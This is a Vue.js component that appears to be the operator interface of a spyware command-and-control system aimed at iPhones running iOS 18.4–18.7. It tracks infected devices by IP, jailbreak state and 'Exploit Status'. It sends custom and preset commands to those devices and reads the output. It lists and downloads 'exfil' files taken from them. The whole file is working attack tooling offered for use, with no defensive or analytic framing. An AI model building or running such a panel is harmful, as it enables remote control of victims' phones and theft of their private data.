<template>
  <div class="device-detail">
    <el-button @click="$router.back()" style="margin-bottom: 20px;">Back</el-button>
    
    <el-alert
      title="Compatibility Notice"
      type="info"
      :closable="false"
      show-icon
      style="margin-bottom: 20px;"
    >
      <p><strong>Supported iOS:</strong> iOS 18.4 - iOS 18.7</p>
      <p><strong>Supported devices:</strong> iPhone 15 series, iPhone 16 series (A17 Pro / A18 chips)</p>
    </el-alert>
    
    <el-card title="Device Info" v-if="device">
      <el-descriptions :column="2">
        <el-descriptions-item label="Device UUID">{{ device.device_uuid }}</el-descriptions-item>
        <el-descriptions-item label="IP Address">{{ device.ip }}</el-descriptions-item>
        <el-descriptions-item label="First Seen">{{ formatTime(device.first_seen) }}</el-descriptions-item>
        <el-descriptions-item label="Last Seen">{{ formatTime(device.last_seen) }}</el-descriptions-item>
        <el-descriptions-item label="Status">
          <el-tag :type="getStatusTag(device.status)">{{ device.status === "active" ? "Active" : "Offline" }}</el-tag>
        </el-descriptions-item>
        <el-descriptions-item label="Jailbreak Status">
          <el-tag :type="getJailbrokenTag(device.jailbroken)">{{ getJailbrokenText(device.jailbroken) }}</el-tag>
        </el-descriptions-item>
        <el-descriptions-item label="iOS Version">{{ device.os_version || "-" }}</el-descriptions-item>
        <el-descriptions-item label="Compatibility">
          <el-tag :type="getCompatibilityTag(device)">{{ getCompatibilityText(device) }}</el-tag>
        </el-descriptions-item>
        <el-descriptions-item label="Device Model">{{ device.device_model || "-" }}</el-descriptions-item>
        <el-descriptions-item label="Chipset">{{ device.chipset || "-" }}</el-descriptions-item>
        <el-descriptions-item label="Exploit Status">
          <el-tag :type="getExploitTag(device.exploit_status)">{{ getExploitText(device.exploit_status) }}</el-tag>
        </el-descriptions-item>
        <el-descriptions-item label="User Agent" :span="2">
          <span style="word-break: break-all;">{{ device.user_agent || "-" }}</span>
        </el-descriptions-item>
      </el-descriptions>
    </el-card>
    <el-tabs style="margin-top: 20px;">
      <el-tab-pane label="Access Logs">
        <el-table :data="logs" border v-loading="logsLoading">
          <el-table-column prop="timestamp" label="Time" width="180" />
          <el-table-column prop="method" label="Method" width="80" />
          <el-table-column prop="path" label="Path" />
          <el-table-column prop="log_type" label="Type" width="100">
            <template #default="scope">
              <el-tag :type="getLogTypeTag(scope.row.log_type)">{{ getLogTypeText(scope.row.log_type) }}</el-tag>
            </template>
          </el-table-column>
        </el-table>
      </el-tab-pane>
      <el-tab-pane label="Command Execution">
        <div style="margin-bottom: 15px;">
          <el-input v-model="newCommand" placeholder="Enter custom command" style="width: 60%;" @keyup.enter="sendCommand" />
          <el-button type="primary" @click="sendCommand" :disabled="!newCommand">Send Command</el-button>
        </div>
        <el-row :gutter="20">
          <el-col :span="12" v-for="category in commandTemplates" :key="category.category">
            <el-card :title="category.category" shadow="hover">
              <div class="command-grid">
                <el-button 
                  v-for="cmd in category.commands" 
                  :key="cmd.command"
                  size="small"
                  @click="executePresetCommand(cmd)"
                  :title="cmd.description"
                  class="command-btn"
                >
                  {{ cmd.name }}
                </el-button>
              </div>
            </el-card>
          </el-col>
        </el-row>
        <el-table :data="commands" border v-loading="commandsLoading">
          <el-table-column prop="command" label="Command" />
          <el-table-column prop="status" label="Status" width="120">
            <template #default="scope">
              <el-tag :type="getCommandStatusTag(scope.row.status)">{{ getCommandStatusText(scope.row.status) }}</el-tag>
            </template>
          </el-table-column>
          <el-table-column prop="output" label="Output" show-overflow-tooltip>
            <template #default="scope">
              <el-button size="small" @click="showOutput(scope.row)">View Output</el-button>
            </template>
          </el-table-column>
          <el-table-column prop="created_at" label="Created At" width="180" />
          <el-table-column prop="executed_at" label="Executed At" width="180" />
          <el-table-column label="Actions" width="120">
            <template #default="scope">
              <el-button size="small" @click="retryCommand(scope.row.id)" v-if="scope.row.status !== 'pending'">Retry</el-button>
              <el-button size="small" type="danger" @click="deleteCommand(scope.row.id)">Delete</el-button>
            </template>
          </el-table-column>
        </el-table>
      </el-tab-pane>
      <el-tab-pane label="Exfil Data">
        <el-table :data="exfil" border v-loading="exfilLoading">
          <el-table-column prop="category" label="Category" width="120" />
          <el-table-column prop="path" label="Original Path" />
          <el-table-column prop="file_size" label="Size" width="100">
            <template #default="scope">{{ formatSize(scope.row.file_size) }}</template>
          </el-table-column>
          <el-table-column prop="uploaded_at" label="Uploaded At" width="180" />
          <el-table-column label="Actions" width="150">
            <template #default="scope">
              <el-button size="small" @click="downloadExfil(scope.row.id)">Download</el-button>
              <el-button size="small" type="danger" @click="deleteExfil(scope.row.id)">Delete</el-button>
            </template>
          </el-table-column>
        </el-table>
      </el-tab-pane>
    </el-tabs>
    <el-dialog title="Command Output" v-model="outputDialogVisible" width="60%">
      <pre style="white-space: pre-wrap; max-height: 400px; overflow-y: auto;">{{ currentOutput }}</pre>
    </el-dialog>
  </div>
</template>
<script setup>
import { ref, onMounted } from "vue"
import { useRoute } from "vue-router"
import { ElMessageBox, ElMessage } from "element-plus"
import axios from "../utils/axios"
import { commandTemplates } from "../data/commandTemplates"

const route = useRoute()
const device = ref(null)
const logs = ref([])
const exfil = ref([])
const commands = ref([])
const newCommand = ref("")
const outputDialogVisible = ref(false)
const currentOutput = ref("")

const logsLoading = ref(false)
const exfilLoading = ref(false)
const commandsLoading = ref(false)

function formatTime(time) {
  if (!time) return "-"
  return new Date(time).toLocaleString("en-US")
}

function formatSize(size) {
  if (!size) return "-"
  if (size < 1024) return size + " B"
  if (size < 1024 * 1024) return (size / 1024).toFixed(2) + " KB"
  return (size / 1024 / 1024).toFixed(2) + " MB"
}

function getStatusTag(status) { return status === "active" ? "success" : "info" }
function getJailbrokenTag(jailbroken) {
  if (jailbroken === "yes") return "danger"
  if (jailbroken === "no") return "success"
  return "info"
}
function getJailbrokenText(jailbroken) {
  if (jailbroken === "yes") return "Jailbroken"
  if (jailbroken === "no") return "Not Jailbroken"
  return "Unknown"
}
function getExploitTag(status) {
  if (status === "success") return "success"
  if (status === "failed") return "danger"
  return "warning"
}
function getExploitText(status) {
  if (status === "success") return "Exploit Successful"
  if (status === "failed") return "Exploit Failed"
  return "Awaiting Exploit"
}
function getCompatibilityTag(device) {
  if (!device.os_version) return 'info'
  
  const supportedVersions = ['18.4', '18.5', '18.6', '18.7']
  if (supportedVersions.includes(device.os_version)) {
    return 'success'
  }
  
  const versionParts = device.os_version.split('.').map(Number)
  const major = versionParts[0] || 0
  const minor = versionParts[1] || 0
  
  if (major < 18 || (major === 18 && minor < 4)) {
    return 'danger'
  }
  
  return 'warning'
}
function getCompatibilityText(device) {
  if (!device.os_version) return 'Unknown'

  const supportedVersions = ['18.4', '18.5', '18.6', '18.7']
  if (supportedVersions.includes(device.os_version)) {
    return 'Compatible'
  }

  const versionParts = device.os_version.split('.').map(Number)
  const major = versionParts[0] || 0
  const minor = versionParts[1] || 0

  if (major < 18 || (major === 18 && minor < 4)) {
    return 'Version Too Low'
  }

  return 'Version Too High'
}
function getLogTypeTag(type) {
  const tags = { ios: "danger", exfil: "danger", request: "info", frontend: "warning", api: "success" }
  return tags[type] || "info"
}
function getLogTypeText(type) {
  const texts = { ios: "iOS Device", exfil: "Exfil", request: "Request", frontend: "Frontend", api: "API" }
  return texts[type] || type
}
function getCommandStatusTag(status) {
  const tags = { pending: "warning", executing: "info", completed: "success", failed: "danger" }
  return tags[status] || "info"
}
function getCommandStatusText(status) {
  const texts = { pending: "Pending", executing: "Executing", completed: "Completed", failed: "Failed" }
  return texts[status] || status
}

async function loadDevice() {
  try {
    const response = await axios.get(`/api/devices/${route.params.uuid}`)
    device.value = response.data
  } catch (error) { console.error("Failed to load device:", error) }
}

async function loadDeviceLogs() {
  logsLoading.value = true
  try {
    const response = await axios.get(`/api/devices/${route.params.uuid}/logs`)
    logs.value = response.data
  } catch (error) { console.error("Failed to load device logs:", error) }
  finally { logsLoading.value = false }
}

async function loadDeviceExfil() {
  exfilLoading.value = true
  try {
    const response = await axios.get(`/api/devices/${route.params.uuid}/exfil`)
    exfil.value = response.data
  } catch (error) { console.error("Failed to load device data:", error) }
  finally { exfilLoading.value = false }
}

async function loadDeviceCommands() {
  commandsLoading.value = true
  try {
    const response = await axios.get(`/api/commands?device_uuid=${route.params.uuid}`)
    commands.value = response.data
  } catch (error) { console.error("Failed to load commands:", error) }
  finally { commandsLoading.value = false }
}

async function sendCommand() {
  if (!newCommand.value.trim()) return
  try {
    await axios.post(`/api/commands?device_uuid=${route.params.uuid}`, { command: newCommand.value })
    ElMessage.success("Command sent")
    newCommand.value = ""
    loadDeviceCommands()
  } catch (error) {
    console.error("Failed to send command:", error)
    ElMessage.error("Failed to send command")
  }
}

async function executePresetCommand(cmd) {
  try {
    await axios.post(`/api/commands?device_uuid=${route.params.uuid}`, { command: cmd.command })
    ElMessage.success(`Command sent: ${cmd.name}`)
    loadDeviceCommands()
  } catch (error) {
    console.error("Failed to send command:", error)
    ElMessage.error("Failed to send command")
  }
}

async function retryCommand(commandId) {
  try {
    await axios.post(`/api/commands/${commandId}/retry`)
    ElMessage.success("Command retried")
    loadDeviceCommands()
  } catch (error) {
    console.error("Failed to retry command:", error)
    ElMessage.error("Failed to retry command")
  }
}

async function deleteCommand(commandId) {
  await ElMessageBox.confirm("Delete this command?", "Warning", { type: "warning" })
  try {
    await axios.delete(`/api/commands/${commandId}`)
    ElMessage.success("Deleted")
    loadDeviceCommands()
  } catch (error) {
    console.error("Failed to delete command:", error)
    ElMessage.error("Delete failed")
  }
}

function showOutput(command) {
  currentOutput.value = command.output || "No output"
  outputDialogVisible.value = true
}

async function downloadExfil(id) {
  try {
    const response = await axios.get(`/api/exfil/${id}/download`, { responseType: "blob" })
    const url = window.URL.createObjectURL(new Blob([response.data]))
    const link = document.createElement("a")
    link.href = url
    link.setAttribute("download", `exfil_${id}.bin`)
    document.body.appendChild(link)
    link.click()
    link.remove()
  } catch (error) {
    console.error("Download failed:", error)
    ElMessage.error("Download failed")
  }
}

async function deleteExfil(id) {
  await ElMessageBox.confirm("Delete this exfil data?", "Warning", { type: "warning" })
  try {
    await axios.delete(`/api/exfil/${id}`)
    ElMessage.success("Deleted")
    loadDeviceExfil()
  } catch (error) {
    console.error("Delete failed:", error)
    ElMessage.error("Delete failed")
  }
}

onMounted(async () => {
  await loadDevice()
  await loadDeviceLogs()
  await loadDeviceExfil()
  await loadDeviceCommands()
})
</script>
<style scoped>
.command-grid {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
}

.command-btn {
  margin: 0;
  white-space: nowrap;
}
</style>
